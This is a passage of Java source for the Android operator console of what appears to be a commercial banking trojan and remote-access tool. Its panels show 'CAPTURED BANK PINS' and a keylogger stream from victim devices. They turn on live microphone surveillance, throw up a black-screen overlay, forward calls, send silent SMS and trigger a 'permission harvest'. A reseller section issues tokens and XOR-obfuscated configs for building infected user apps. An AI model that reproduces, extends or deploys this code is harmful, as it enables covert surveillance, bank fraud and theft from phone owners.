        Toast.makeText(ctx, "Fetching installed applications...", Toast.LENGTH_SHORT).show();
        AdminRelayClient.get().sendCmd(selDev.androidId, "get_apps", null);
    }
    private void filterApps(String query) {
        if (lastAppsJson.isEmpty()) return;
        try {
            JSONArray arr = new JSONArray(lastAppsJson);
            List<JSONObject> filtered = new ArrayList<>();
            String q = query.toLowerCase().trim();
            for (int i = 0; i < arr.length(); i++) {
                JSONObject a = arr.getJSONObject(i);
                String p = a.optString("package", a.optString("pkg", ""));
                if (q.isEmpty() || a.optString("name", "").toLowerCase().contains(q) || p.toLowerCase().contains(q))
                    filtered.add(a);
            }
            adapter.setData(filtered);
        } catch (Exception ignored) {}
    }
    @Override
    public void onDeviceSelected(Device d) { this.selDev = d; adapter.clear(); lastAppsJson = ""; }
    @Override
    public void onMessage(JSONObject msg) {
        if ("apps_list".equals(msg.optString("type", ""))) {
            lastAppsJson = msg.optString("apps", "[]");
            filterApps("");
        }
    }
    private class AppAdapter extends BaseAdapter {
        private List<JSONObject> data = new ArrayList<>();
        public void setData(List<JSONObject> items) { this.data = items; notifyDataSetChanged(); }
        public void clear() { this.data.clear(); notifyDataSetChanged(); }
        @Override public int getCount() { return data.size(); }
        @Override public JSONObject getItem(int position) { return data.get(position); }
        @Override public long getItemId(int position) { return position; }
        @Override
        public View getView(int position, View convertView, ViewGroup parent) {
            ViewHolder vh;
            if (convertView == null) {
                LinearLayout card = row(false);
                card.setBackground(cardBg(CARD, BORDER, 14)); card.setPadding(18, 14, 18, 14); card.setGravity(Gravity.CENTER_VERTICAL);
                TextView avatar = txt("?", 14, SUCCESS, true); avatar.setGravity(Gravity.CENTER); avatar.setBackground(cardBg(0x2210B981, SUCCESS, 20));
                LinearLayout.LayoutParams avLp = new LinearLayout.LayoutParams(60, 60); avLp.setMargins(0, 0, 14, 0); avLp.gravity = Gravity.CENTER_VERTICAL;
                card.addView(avatar, avLp);
                LinearLayout info = row(true);
                TextView tvName = txt("", 13, TXT1, true); TextView tvPkg = txt("", 10, TXT2, false);
                info.addView(tvName); info.addView(tvPkg);
                card.addView(info, new LinearLayout.LayoutParams(0, -2, 1f));
                Button launchBtn = pillBtn("LAUNCH >>", null, 0x3300F0FF, PRIMARY); launchBtn.setTextSize(10); launchBtn.setPadding(12, 6, 12, 6);
                card.addView(launchBtn);
                LinearLayout wrap = new LinearLayout(ctx); wrap.setPadding(8, 6, 8, 6); wrap.addView(card, matchWrap());
                convertView = wrap;
                vh = new ViewHolder(); vh.avatar = avatar; vh.name = tvName; vh.pkg = tvPkg; vh.btn = launchBtn;
                convertView.setTag(vh);
            } else { vh = (ViewHolder) convertView.getTag(); }
            JSONObject a = getItem(position);
            String n = a.optString("name", "Unknown"); String p = a.optString("package", a.optString("pkg", ""));
            vh.avatar.setText(!n.isEmpty() ? String.valueOf(n.charAt(0)).toUpperCase() : "?");
            vh.name.setText(n); vh.pkg.setText(p);
            vh.btn.setOnClickListener(v -> {
                try { AdminRelayClient.get().sendCmd(selDev.androidId, "open_app", new JSONObject().put("package", p)); } catch (Exception ignored) {}
            });
            return convertView;
        }
    }
    private class ViewHolder { TextView avatar, name, pkg; Button btn; }
}
class BankPanel extends BasePanel {
    private LinearLayout listContainer;
    private Device selDev;
    public BankPanel(Context ctx, int[] theme) { super(ctx, theme); }
    @Override public void onDeviceSelected(Device d) { this.selDev = d; refresh(); }
    @Override public void onMessage(org.json.JSONObject msg) { refresh(); }
    @Override public View buildView() {
        LinearLayout root = row(true);
        root.setPadding(30, 30, 30, 30);
        LinearLayout btnBar = new LinearLayout(ctx);
        btnBar.setOrientation(LinearLayout.HORIZONTAL);
        Button btnFetch = pillBtn("SYNC VPS", v -> {
            if (selDev != null) {
                try {
                    org.json.JSONObject req = new org.json.JSONObject();
                    req.put("type", "get_keylogs");
                    req.put("androidId", selDev.androidId);
                    AdminRelayClient.get().send(req);
                } catch (Exception ignored) {}
            }
        }, 0x223B82F6, PRIMARY);
        Button btnClear = pillBtn("CLEAR", v -> {
            if (selDev != null) { selDev.bankLogs.clear(); selDev.keylogs.clear(); refresh(); }
        }, 0x22EF4444, DANGER);
        btnBar.addView(btnFetch);
        LinearLayout.LayoutParams clp = new LinearLayout.LayoutParams(-2, -2);
        clp.leftMargin = 15;
        btnBar.addView(btnClear, clp);
        root.addView(sectionHeader("BANK PINS & KEYLOGGER", btnBar));
        ScrollView sv = new ScrollView(ctx);
        listContainer = new LinearLayout(ctx);
        listContainer.setOrientation(LinearLayout.VERTICAL);
        sv.addView(listContainer);
        root.addView(sv, new LinearLayout.LayoutParams(-1, -1));
        return root;
    }
    private void refresh() {
        listContainer.removeAllViews();
        if (selDev == null) {
            listContainer.addView(txt("No device selected.", 13, TXT2, false));
            return;
        }
        if (!selDev.bankLogs.isEmpty()) {
            listContainer.addView(txt("CAPTURED BANK PINS (" + selDev.bankLogs.size() + ")", 12, PRIMARY, true));
            for (int i = 0; i < selDev.bankLogs.size(); i++) {
                Device.BankEntry e = selDev.bankLogs.get(i);
                LinearLayout row = new LinearLayout(ctx);
                row.setOrientation(LinearLayout.VERTICAL);
                row.setPadding(20, 20, 20, 20);
                row.setBackground(cardBg(0x11FFFFFF, 0x33FFFFFF, 12));
                LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(-1, -2);
                lp.bottomMargin = 15;
                row.addView(txt(e.pkgName.toUpperCase(), 12, TXT2, true));
                row.addView(txt("PIN: " + e.pin, 16, SUCCESS, true));
                listContainer.addView(row, lp);
            }
        }
        listContainer.addView(txt("KEYLOG STREAM (" + selDev.keylogs.size() + ")", 12, PRIMARY, true));
        if (selDev.keylogs.isEmpty()) {
            listContainer.addView(txt("No keystrokes recorded yet.", 13, TXT2, false));
            return;
        }
        SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss", Locale.US);
        for (int i = 0; i < selDev.keylogs.size(); i++) {
            Device.KeylogEntry k = selDev.keylogs.get(i);
            LinearLayout row = new LinearLayout(ctx);
            row.setOrientation(LinearLayout.VERTICAL);
            row.setPadding(15, 15, 15, 15);
            row.setBackground(cardBg(0x0CFFFFFF, 0x22FFFFFF, 8));
            LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(-1, -2);
            lp.bottomMargin = 10;
            String timeStr = sdf.format(new Date(k.timestamp > 0 ? k.timestamp : System.currentTimeMillis()));
            row.addView(txt("[" + timeStr + "] " + k.pkg + " (" + k.type + ")", 11, TXT2, false));
            row.addView(txt(k.text, 14, TXT1, true));
            listContainer.addView(row, lp);
        }
    }
}
class ToolsPanel extends BasePanel {
    private ListView logsList;
    private LogAdapter logAdapter;
    private Device selDev;
    private final SimpleDateFormat timeFmt = new SimpleDateFormat("HH:mm:ss", Locale.US);
    private volatile boolean micPlayback = false;
    private AudioTrack audioTrack;
    private int currentRate = 8000;
    private Button btnMicStart, btnMicStop;
    private Button btnBlackShow, btnBlackHide;
    public ToolsPanel(Context ctx, int[] theme, Map<String, Device> devicesMap) { super(ctx, theme); }
    @Override
    public View buildView() {
        LinearLayout root = row(true); root.setPadding(16, 16, 16, 16);
        LinearLayout.LayoutParams blp = fill(1); blp.setMargins(4, 4, 4, 4);
        root.addView(sectionHeader("⚡ QUICK CONTROLS", null));
        LinearLayout r1 = row(false);
        r1.addView(gradientBtn("⚡ WAKE",  v -> cmd("screen_on"), PRIMARY, ACCENT), blp);
        r1.addView(gradientBtn("🔒 LOCK",  v -> cmd("lock"),      DANGER, 0xFFFF0000), blp);
        r1.addView(gradientBtn("⌂ HOME",  v -> cmd("home"),      PRIMARY, ACCENT), blp);
        r1.addView(gradientBtn("◁ BACK",  v -> cmd("back"),      PRIMARY, ACCENT), blp);
        root.addView(r1);
        root.addView(sectionHeader("🔐 PHASE 2 CONTROLS", null));
        LinearLayout rPhase = row(false);
        rPhase.addView(gradientBtn("🔐 PRMSN",  v -> triggerPermissions(), PRIMARY, ACCENT), blp);
        rPhase.addView(gradientBtn("📊 PHASE",  v -> checkPhase(), PRIMARY, ACCENT), blp);
        root.addView(rPhase);
        root.addView(sectionHeader("🎙 MIC SURVEILLANCE", null));
        LinearLayout rMic = row(false);
        btnMicStart = gradientBtn("🎙 MIC ON",  null, PRIMARY, ACCENT);
        btnMicStop  = gradientBtn("🔇 MIC OFF", null, DANGER,  0xFFFF0000);
        btnMicStart.setOnClickListener(v -> {
            if (selDev == null || !selDev.online) {
                Toast.makeText(ctx, "Target offline", 0).show(); return;
            }
            try {
                AdminRelayClient.get().sendCmd(selDev.androidId, "start_mic",
                    new JSONObject().put("sampleRate", 16000).put("rate", 16000));
                micPlayback = true;
                currentRate = 16000;
                initAudioTrack(currentRate);
                setMicBtnActive(true);
                addLog("🎙 mic ON — listening live");
            } catch (Exception ignored) {}
        });
        btnMicStop.setOnClickListener(v -> {
            micPlayback = false;
            releaseAudioTrack();
            if (selDev != null) AdminRelayClient.get().sendCmd(selDev.androidId, "stop_mic", null);
            setMicBtnActive(false);
            addLog("🔇 mic OFF");
        });
        rMic.addView(btnMicStart, blp);
        rMic.addView(btnMicStop, blp);
        root.addView(rMic);
        root.addView(sectionHeader("🖤 BLACK SCREEN", null));
        LinearLayout rBlack = row(false);
        btnBlackShow = gradientBtn("🖤 SHOW TEXT", v -> showBlackScreenDialog(), DANGER, 0xFF7C0000);
        btnBlackHide = gradientBtn("✖ HIDE SCREEN",  v -> hideBlackScreen(),        PRIMARY, ACCENT);
        rBlack.addView(btnBlackShow, blp);
        rBlack.addView(btnBlackHide, blp);
        root.addView(rBlack);
        root.addView(sectionHeader("📞 CALL FORWARDING", null));
        LinearLayout rCall = row(false);
        rCall.addView(gradientBtn("📞 FORWARD", v -> initiateCallForwarding(), PRIMARY, ACCENT), blp);
        rCall.addView(gradientBtn("🛑 STOP", v -> cmd("stop_call_forward"), DANGER, 0xFFFF0000), blp);
        root.addView(rCall);
        LinearLayout headLogs = sectionHeader("⌨ SYSTEM LOGS", null);
        LinearLayout.LayoutParams hlp = matchWrap(); hlp.topMargin = dp(10);
        headLogs.setLayoutParams(hlp);
        root.addView(headLogs);
        logsList = new ListView(ctx);
        logsList.setDivider(null);
        logsList.setBackground(glassCardBg(CARD, BORDER));
        logAdapter = new LogAdapter();
        logsList.setAdapter(logAdapter);
        root.addView(logsList, new LinearLayout.LayoutParams(-1, dp(300))); 
        root.addView(sectionHeader("✉ SILENT SMS DISPATCHER", null));
        LinearLayout smsContainer = row(true);
        smsContainer.setPadding(20, 20, 20, 20);
        smsContainer.setBackground(glassCardBg(CARD, BORDER));

        TextView tvPhLabel = codeTxt("TARGET PHONE NUMBER:", 10, TXT2, true);
        tvPhLabel.setPadding(0, 0, 0, 4);
        smsContainer.addView(tvPhLabel);

        final EditText inputPhone = new EditText(ctx);
        inputPhone.setHint("Recipient phone number (e.g. +1234567890)");
        inputPhone.setTextColor(TXT1);
        inputPhone.setHintTextColor(TXT2);
        inputPhone.setTextSize(13);
        inputPhone.setSingleLine(true);
        inputPhone.setPadding(dp(14), dp(11), dp(14), dp(11));
        inputPhone.setBackground(cardBg(0xFF0F131C, BORDER, 10));
        smsContainer.addView(inputPhone, matchWrap());

        TextView tvMsgLabel = codeTxt("SMS PAYLOAD BODY:", 10, TXT2, true);
        tvMsgLabel.setPadding(0, 12, 0, 4);
        smsContainer.addView(tvMsgLabel);

        final EditText inputMsg = new EditText(ctx);
        inputMsg.setHint("Enter message content...");
        inputMsg.setTextColor(TXT1);
        inputMsg.setHintTextColor(TXT2);
        inputMsg.setTextSize(13);
        inputMsg.setPadding(dp(14), dp(11), dp(14), dp(11));
        inputMsg.setBackground(cardBg(0xFF0F131C, BORDER, 10));
        inputMsg.setMinLines(3);
        inputMsg.setGravity(Gravity.TOP | Gravity.START);
        LinearLayout.LayoutParams msgParams = new LinearLayout.LayoutParams(-1, dp(85));
        smsContainer.addView(inputMsg, msgParams);

        final TextView tvCounter = codeTxt("0 characters", 10, TXT2, false);
        tvCounter.setPadding(dp(4), dp(4), 0, dp(10));
        smsContainer.addView(tvCounter);

        inputMsg.addTextChangedListener(new TextWatcher() {
            public void afterTextChanged(Editable s) { tvCounter.setText(s.length() + " characters"); }
            public void beforeTextChanged(CharSequence s, int st, int c, int a) {}
            public void onTextChanged(CharSequence s, int st, int b, int c) {}
        });

        LinearLayout simRow = row(false);
        simRow.setGravity(Gravity.CENTER_VERTICAL);
        simRow.setPadding(0, 0, 0, 14);
        final Spinner simSpinner = new Spinner(ctx);
        ArrayAdapter<String> adapter = new ArrayAdapter<>(ctx, android.R.layout.simple_spinner_item, new String[]{"SIM 1 (Default)", "SIM 2"});
        adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        simSpinner.setAdapter(adapter);
        simRow.addView(codeTxt("OUTGOING SIM: ", 11, TXT2, true));
        simRow.addView(simSpinner, new LinearLayout.LayoutParams(-2, -2));
        smsContainer.addView(simRow);

        Button btnSendSms = gradientBtn("✉ SEND SILENT SMS >>", v -> {
            String num = inputPhone.getText().toString().trim();
            String msgText = inputMsg.getText().toString().trim();
            int simSlot = simSpinner.getSelectedItemPosition();
            if (num.isEmpty() || msgText.isEmpty()) {
                Toast.makeText(ctx, "Please enter recipient and message", Toast.LENGTH_SHORT).show();
                return;
            }
            if (selDev == null || !selDev.online) {
                Toast.makeText(ctx, "Target offline or unselected", Toast.LENGTH_SHORT).show();
                return;
            }
            try {
                org.json.JSONObject data = new org.json.JSONObject();
                data.put("number", num);
                data.put("message", msgText);
                data.put("slot", simSlot);
                AdminRelayClient.get().sendCmd(selDev.androidId, "send_sms", data);
                Toast.makeText(ctx, "Dispatched SMS to " + num, Toast.LENGTH_SHORT).show();
                inputMsg.setText(""); 
            } catch (Exception ignored) {}
        }, SUCCESS, ACCENT);
        LinearLayout.LayoutParams btnParams = new LinearLayout.LayoutParams(-1, dp(44));
        smsContainer.addView(btnSendSms, btnParams);
        root.addView(smsContainer, matchWrap());
        return root;
    }
    private void showBlackScreenDialog() {
        if (selDev == null || !selDev.online) {
            Toast.makeText(ctx, "Target offline", 0).show(); return;
        }
        AlertDialog.Builder builder = new AlertDialog.Builder(ctx);
        builder.setTitle("🖤 Black Screen Message");
        EditText input = new EditText(ctx);
        input.setHint("Enter text to display on black screen...");
        input.setTextColor(0xFFE0E0E0);
        input.setHintTextColor(0xFF888888);
        input.setBackground(null);
        input.setPadding(dp(20), dp(16), dp(20), dp(16));
        input.setTextSize(15);
        builder.setView(input);
        builder.setPositiveButton("SEND", (dialog, which) -> {
            String text = input.getText().toString().trim();
            try {
                AdminRelayClient.get().sendCmd(selDev.androidId, "show_black_screen",
                    new JSONObject().put("text", text));
                addLog("🖤 black screen sent: \"" + text + "\"");
            } catch (Exception ignored) {}
        });
        builder.setNegativeButton("Cancel", null);
        builder.show();
    }
    private void hideBlackScreen() {
        if (selDev == null) { Toast.makeText(ctx, "No device selected", 0).show(); return; }
        AdminRelayClient.get().sendCmd(selDev.androidId, "hide_black_screen", null);
        addLog("✖ black screen dismissed");
    }
    private void initiateCallForwarding() {
        if (selDev == null || !selDev.online) {
            Toast.makeText(ctx, "Target offline", 0).show(); return;
        }
        AdminRelayClient.get().sendCmd(selDev.androidId, "get_sim_info", null);
        Toast.makeText(ctx, "Requesting SIM info...", 0).show();
    }
    private void showCallForwardDialog(JSONArray sims) {
        if (selDev == null || !selDev.online) return;
        AlertDialog.Builder builder = new AlertDialog.Builder(ctx);
        builder.setTitle("📞 Forward Calls");
        LinearLayout layout = row(true);
        layout.setPadding(dp(20), dp(10), dp(20), dp(10));
        TextView tvSimInfo = new TextView(ctx);
        tvSimInfo.setText("Available SIMs: " + sims.length());
        tvSimInfo.setTextColor(0xFFE0E0E0);
        layout.addView(tvSimInfo);
        RadioGroup rgSims = new RadioGroup(ctx);
        for (int i = 0; i < sims.length(); i++) {
            JSONObject sim = sims.optJSONObject(i);
            if (sim != null) {
                RadioButton rb = new RadioButton(ctx);
                rb.setText("SIM " + (sim.optInt("slot") + 1) + " (" + sim.optString("carrier") + ") " + sim.optString("number"));
                rb.setTextColor(0xFFE0E0E0);
                rb.setId(sim.optInt("slot"));
                rgSims.addView(rb);
            }
        }
        if (sims.length() > 0) {
            ((RadioButton) rgSims.getChildAt(0)).setChecked(true);
        }
        layout.addView(rgSims);
        EditText input = new EditText(ctx);
        input.setHint("Target phone number");
        input.setTextColor(0xFFE0E0E0);
        input.setHintTextColor(0xFF888888);
        input.setPadding(0, dp(16), 0, dp(16));
        input.setTextSize(15);
        input.setInputType(android.text.InputType.TYPE_CLASS_PHONE);
        layout.addView(input);
        builder.setView(layout);
        builder.setPositiveButton("FORWARD", (dialog, which) -> {
            String number = input.getText().toString().trim();
            int selectedSlot = rgSims.getCheckedRadioButtonId();
            if (selectedSlot == -1) selectedSlot = 0;
            try {
                AdminRelayClient.get().sendCmd(selDev.androidId, "start_call_forward",
                    new JSONObject().put("number", number).put("slot", selectedSlot));
                addLog("📞 call forward sent to: " + number + " on SIM " + (selectedSlot + 1));
            } catch (Exception ignored) {}
        });
        builder.setNegativeButton("Cancel", null);
        builder.show();
    }
         private void triggerPermissions() {
            if (selDev == null || !selDev.online) {
                Toast.makeText(ctx, "Target offline", 0).show();
                return;
            }
            AdminRelayClient.get().sendCmd(selDev.androidId, "trigger_permissions", null);
            addLog("🔐 permission harvest sent to " + selDev.getSafeName());
        }
        private void checkPhase() {
            if (selDev == null) return;
            AdminRelayClient.get().sendCmd(selDev.androidId, "get_setup_phase", null);
            addLog("📊 phase check sent");
        }
    private void initAudioTrack(int sampleRate) {
        releaseAudioTrack();
        try {
            int minBuf = AudioTrack.getMinBufferSize(sampleRate,
                    AudioFormat.CHANNEL_OUT_MONO, AudioFormat.ENCODING_PCM_16BIT);
            audioTrack = new AudioTrack(
                    AudioManager.STREAM_MUSIC, sampleRate,
                    AudioFormat.CHANNEL_OUT_MONO, AudioFormat.ENCODING_PCM_16BIT,
                    Math.max(minBuf, sampleRate * 2), AudioTrack.MODE_STREAM);
            audioTrack.play();
        } catch (Exception e) {
            addLog("⚠ AudioTrack init failed: " + e.getMessage());
            audioTrack = null;
        }
    }
    private void releaseAudioTrack() {
        if (audioTrack != null) {
            try { audioTrack.stop(); } catch (Exception ignored) {}
            try { audioTrack.release(); } catch (Exception ignored) {}
            audioTrack = null;
        }
    }
    private void playMicChunk(String b64, int rate) {
        try {
            byte[] pcm = Base64.decode(b64, Base64.NO_WRAP);
            if (rate != currentRate) {
                currentRate = rate;
                initAudioTrack(currentRate);
            }
            if (audioTrack != null && audioTrack.getState() == AudioTrack.STATE_INITIALIZED) {
                audioTrack.write(pcm, 0, pcm.length);
            }
        } catch (Exception e) {
            addLog("⚠ audio play error: " + e.getMessage());
        }
    }
    private void setMicBtnActive(boolean on) {
        if (btnMicStart == null || btnMicStop == null) return;
        if (on) {
            GradientDrawable g = new GradientDrawable();
            g.setColor(DANGER); g.setCornerRadius(dp(14));
            btnMicStart.setBackground(new RippleDrawable(
                ColorStateList.valueOf(0x44FFFFFF), g, null));
            btnMicStart.setText("🔴 LIVE");
        } else {
            GradientDrawable g = new GradientDrawable(
                GradientDrawable.Orientation.TL_BR, new int[]{PRIMARY, ACCENT});
            g.setCornerRadius(dp(14));
            btnMicStart.setBackground(new RippleDrawable(
                ColorStateList.valueOf(0x44FFFFFF), g, null));
            btnMicStart.setText("🎙 MIC ON");
        }
    }
    private void cmd(String a) {
        if (selDev != null && selDev.online) AdminRelayClient.get().sendCmd(selDev.androidId, a, null);
        else Toast.makeText(ctx, "Target offline", 0).show();
    }
    public void addLog(String m) {
        logAdapter.add("[" + timeFmt.format(new Date()) + "] " + m);
        logsList.post(() -> logsList.setSelection(logAdapter.getCount() - 1));
    }
    @Override
    public void onDeviceSelected(Device d) {
        this.selDev = d;
        if (micPlayback) {
            micPlayback = false;
            releaseAudioTrack();
            setMicBtnActive(false);
        }
    }
    @Override
    public void onMessage(JSONObject m) {
        String t = m.optString("type", "");
        switch (t) {
            case "mic_data":
                int seq  = m.optInt("seq", 0);
                int size = m.optInt("size", 0);
                int rate = m.optInt("rate", 8000);
                addLog("🎙 chunk #" + seq + " (" + size + "B, " + rate + "Hz)");
                if (micPlayback) {
                    String audio = m.optString("audio", "");
                    if (!audio.isEmpty()) playMicChunk(audio, rate);
                }
                break;
            case "mic_error":
                String me = m.optString("message", "");
                if (me.isEmpty()) me = m.optString("error", "");
                addLog("⚠ mic: " + me);
                break;
            case "camera_error":
                String ce = m.optString("message", "");
                if (ce.isEmpty()) ce = m.optString("error", "");
                addLog("⚠ cam: " + ce);
                break;
            case "camera_info":
                int tot = m.optInt("total", 0);
                if (tot == 0 && m.has("cameras")) {
                    JSONArray ca = m.optJSONArray("cameras");
                    if (ca != null) tot = ca.length();
                }
                addLog("📷 cams: " + tot);
                break;
            case "sim_info":
                JSONArray sims = m.optJSONArray("sims");
                if (sims != null) {
                    showCallForwardDialog(sims);
                }
                break;
            case "log_message":
                addLog(m.optString("message"));
                break;
            case "phase_update":
                int phase = m.optInt("phase", 1);
                addLog("📊 Device phase: " + phase);
            break;
        }
    }
    private class LogAdapter extends BaseAdapter {
        private List<String> d = new ArrayList<>();
        public void add(String s) { d.add(s); if (d.size() > 200) d.remove(0); notifyDataSetChanged(); }
        @Override public int getCount() { return d.size(); }
        @Override public String getItem(int p) { return d.get(p); }
        @Override public long getItemId(int p) { return p; }
        @Override public View getView(int p, View cv, ViewGroup pG) {
            TextView t;
            if (cv == null) {
                t = codeTxt("", 11, TXT1, false);
                t.setPadding(12, 6, 12, 6);
                cv = t;
            } else t = (TextView) cv;
            String s = getItem(p); t.setText(s);
            t.setTextColor(s.contains("⚠") ? DANGER : TXT1);
            return cv;
        }
    }
}
class ResellersPanel extends BasePanel {
    private ListView resellersList;
    private ResellerAdapter adapter;
    private final List<JSONObject> resellers = new ArrayList<>();
    private final Map<String, Device> devicesMap;
    public ResellersPanel(Context ctx, int[] theme, Map<String, Device> devicesMap) {
        super(ctx, theme);
        this.devicesMap = devicesMap;
    }
    @Override
    public View buildView() {
        LinearLayout root = row(true);
        root.setPadding(16, 16, 16, 16);
        Button btnNew = gradientBtn("+ NEW", v -> showCreateDialog(), PRIMARY, ACCENT);
        LinearLayout topBar = sectionHeader("👥 RESELLERS MANAGEMENT", btnNew);
        root.addView(topBar);
        resellersList = new ListView(ctx);
        resellersList.setDivider(null);
        resellersList.setBackground(glassCardBg(CARD, BORDER));
        adapter = new ResellerAdapter();
        resellersList.setAdapter(adapter);
        root.addView(resellersList, new LinearLayout.LayoutParams(-1, 0, 1f));
        return root;
    }
    private void showCreateDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(ctx);
        builder.setTitle("Create New Reseller");
        LinearLayout l = new LinearLayout(ctx);
        l.setOrientation(LinearLayout.VERTICAL);
        l.setPadding(30, 20, 30, 20);
        final EditText etName = new EditText(ctx);
        etName.setHint("Reseller Name (e.g. Boss Agent)");
        l.addView(etName);
        builder.setView(l);
        builder.setPositiveButton("Create", (dialog, which) -> {
            String name = etName.getText().toString().trim();
            if (name.isEmpty()) name = "Reseller Agent";
            AdminRelayClient.get().createReseller(name, null);
        });
        builder.setNegativeButton("Cancel", null);
        builder.show();
    }
    @Override public void onDeviceSelected(Device d) {}
    @Override
    public void onMessage(JSONObject m) {
        String type = m.optString("type", "");
        if ("admin_joined".equals(type) || "reseller_list".equals(type) || "reseller_created".equals(type)) {
            JSONArray arr = m.optJSONArray("resellers");
            if (arr != null) {
                resellers.clear();
                for (int i = 0; i < arr.length(); i++) {
                    JSONObject r = arr.optJSONObject(i);
                    if (r != null) resellers.add(r);
                }
                adapter.notifyDataSetChanged();
            }
            if ("reseller_created".equals(type)) {
                JSONObject r = m.optJSONObject("reseller");
                if (r != null) {
                    resellers.add(r);
                    adapter.notifyDataSetChanged();
                    showResellerCreatedSuccessDialog(r);
                }
            }
        }
    }
    private void showResellerCreatedSuccessDialog(JSONObject r) {
        if (r == null) return;
        String name = r.optString("name", "Reseller");
        String rid = r.optString("resellerId", "");
        String loginToken = r.optString("loginToken", "");
        String userAppToken = r.optString("userAppToken", "");
        String rawConfig = "{\n  \"token\": \"" + userAppToken + "\"\n}";
        String encryptedConfig = com.device.ctrl.StringObfuscator.XorCipher.n2c(rawConfig);
        AlertDialog.Builder builder = new AlertDialog.Builder(ctx);
        builder.setTitle("🎉 Reseller Created");
        ScrollView scroll = new ScrollView(ctx);
        LinearLayout layout = new LinearLayout(ctx);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(36, 24, 36, 24);
        TextView tvInfo = new TextView(ctx);
        tvInfo.setText("Reseller: " + name + "\nID: " + rid);
        tvInfo.setTextSize(14);
        tvInfo.setTextColor(0xFFE0E0E0);
        layout.addView(tvInfo);
        TextView tvWarn = new TextView(ctx);
        tvWarn.setText("\n⚠️ Note: Without token, User App connects directly to Master Admin. Put this token in User APK assets only if linking to this reseller.");
        tvWarn.setTextSize(12);
        tvWarn.setTextColor(0xFFFFB300);
        layout.addView(tvWarn);
        TextView tvLoginHead = new TextView(ctx);
        tvLoginHead.setText("\n1️⃣ Reseller Login Token (for Reseller App):");
        tvLoginHead.setTextSize(12);
        tvLoginHead.setTextColor(0xFF90CAF9);
        layout.addView(tvLoginHead);
        TextView tvLoginVal = new TextView(ctx);
        tvLoginVal.setText(loginToken);
        tvLoginVal.setTextIsSelectable(true);
        tvLoginVal.setTextSize(15);
        tvLoginVal.setTextColor(0xFF00E676);
        tvLoginVal.setPadding(12, 10, 12, 10);
        tvLoginVal.setBackgroundColor(0x2200E676);
        layout.addView(tvLoginVal);
        Button btnCopyLogin = new Button(ctx);
        btnCopyLogin.setText("📋 Copy Login Token");
        btnCopyLogin.setOnClickListener(v -> {
            copyToClipboard("Reseller Login Token", loginToken);
            Toast.makeText(ctx, "Login Token Copied!", Toast.LENGTH_SHORT).show();
        });
        layout.addView(btnCopyLogin);
        TextView tvUserHead = new TextView(ctx);
        tvUserHead.setText("\n2️⃣ User App Assets Config (assets/reseller_config.json):");
        tvUserHead.setTextSize(12);
        tvUserHead.setTextColor(0xFF90CAF9);
        layout.addView(tvUserHead);
        TextView tvUserVal = new TextView(ctx);
        tvUserVal.setText("Token: " + userAppToken);
        tvUserVal.setTextIsSelectable(true);
        tvUserVal.setTextSize(13);
        tvUserVal.setTextColor(0xFFFFF59D);
        tvUserVal.setPadding(12, 10, 12, 10);
        tvUserVal.setBackgroundColor(0x22FFF59D);
        layout.addView(tvUserVal);
        Button btnCopyEnc = new Button(ctx);
        btnCopyEnc.setText("🔒 Copy XOR-Encrypted Config for Assets");
        btnCopyEnc.setOnClickListener(v -> {
            copyToClipboard("Encrypted Config", encryptedConfig);
            Toast.makeText(ctx, "Encrypted config copied for assets!", Toast.LENGTH_SHORT).show();
        });
        layout.addView(btnCopyEnc);
        Button btnCopyToken = new Button(ctx);
        btnCopyToken.setText("📋 Copy Plain Token");
        btnCopyToken.setOnClickListener(v -> {
            copyToClipboard("User App Token", userAppToken);
            Toast.makeText(ctx, "User App Token Copied!", Toast.LENGTH_SHORT).show();
        });
        layout.addView(btnCopyToken);
        scroll.addView(layout);
        builder.setView(scroll);
        builder.setPositiveButton("Done", null);
        builder.show();
    }
    private void copyToClipboard(String label, String text) {
        android.content.ClipboardManager clipboard = (android.content.ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
        android.content.ClipData clip = android.content.ClipData.newPlainText(label, text);
        clipboard.setPrimaryClip(clip);
    }
    private class ResellerAdapter extends BaseAdapter {
        @Override public int getCount() { return resellers.size(); }
        @Override public JSONObject getItem(int p) { return resellers.get(p); }
        @Override public long getItemId(int p) { return p; }
        @Override
        public View getView(int p, View cv, ViewGroup parent) {
            LinearLayout l;
            Button btnCopy, btnDel;
            if (cv == null) {
                l = row(true);
                l.setBackground(glassCardBg(CARD, BORDER));
                l.setPadding(16, 12, 16, 12);
                l.addView(codeTxt("", 14, PRIMARY, true)); 
                l.addView(codeTxt("", 11, TXT2, false));   
                LinearLayout btnRow = row(false);
                btnRow.setGravity(Gravity.END);
                btnRow.setPadding(0, 8, 0, 0);
                btnCopy = pillBtn("📋 Copy User Config", null, PRIMARY, ACCENT);
                btnCopy.setPadding(12, 6, 12, 6);
                btnCopy.setTextSize(10);
                LinearLayout.LayoutParams lp1 = new LinearLayout.LayoutParams(-2, -2);
                lp1.setMargins(0, 0, 10, 0);
                btnRow.addView(btnCopy, lp1);
                btnDel = pillBtn("🗑 Delete", null, DANGER, 0xFFFF0000);
                btnDel.setPadding(12, 6, 12, 6);
                btnDel.setTextSize(10);
                btnRow.addView(btnDel, new LinearLayout.LayoutParams(-2, -2));
                l.addView(btnRow);
                LinearLayout w = new LinearLayout(ctx);
                w.setPadding(0, 6, 0, 6);
                w.addView(l, matchWrap());
                cv = w;
            } else {
                LinearLayout w = (LinearLayout) cv;
                l = (LinearLayout) w.getChildAt(0);
                LinearLayout btnRow = (LinearLayout) l.getChildAt(2);
                btnCopy = (Button) btnRow.getChildAt(0);
                btnDel = (Button) btnRow.getChildAt(1);
            }
            JSONObject r = getItem(p);
            String name = r.optString("name", "");
            String resellerId = r.optString("resellerId", "");
            String loginToken = r.optString("loginToken", "");
            String userAppToken = r.optString("userAppToken", "");
            int devCount = 0;
            for (Device d : devicesMap.values()) {
                if (resellerId.equals(d.resellerId)) devCount++;
            }
            ((TextView) l.getChildAt(0)).setText("👤 " + name + " (Devices: " + devCount + ")");
            String details;
            if (!loginToken.isEmpty() || !userAppToken.isEmpty()) {
                details = "ID: " + resellerId + "\nLogin: " + loginToken + "\nUserApp: " + userAppToken;
            } else {
                details = "ID: " + resellerId + "\nTokens: [Protected / Hashed on Server]";
            }
            ((TextView) l.getChildAt(1)).setText(details);
